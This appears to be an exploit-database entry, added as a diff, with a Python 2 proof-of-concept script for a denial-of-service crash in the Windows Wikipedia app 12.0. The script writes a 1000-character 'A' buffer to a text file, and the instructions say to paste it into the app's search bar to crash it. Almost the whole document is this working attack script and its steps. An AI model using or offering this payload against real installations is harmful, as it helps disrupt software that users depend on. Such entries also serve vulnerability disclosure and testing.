@@ -1,0 +1,25 @@
+# Exploit Title: Wikipedia 12.0 - Denial of Service (PoC)
+# Date: 9/2/2018
+# Author: 0xB9
+# Twitter: @0xB9Sec
+# Contact: 0xB9[at]pm.me
+# Software Link: https://www.microsoft.com/en-us/p/wikipedia/9wzdncrfhwm4?activetab=pivot%3aoverviewtab
+# Version: 12.0
+# Tested on: Windows 10
+
+# Proof of Concept:
+# Run the python script, it will create a new file "wiki.txt"
+# Copy the text from the generated wiki.txt file to clipboard
+# Paste the text in the search bar in the top right of app
+# App will now crash
+
+buffer = "A" * 1000
+payload = buffer
+try:
+    f=open("wiki.txt","w")
+    print "[+] Creating %s evil payload.." %len(payload)
+    f.write(payload)
+    f.close()
+    print "[+] File created!"
+except:
+    print "File cannot be created"
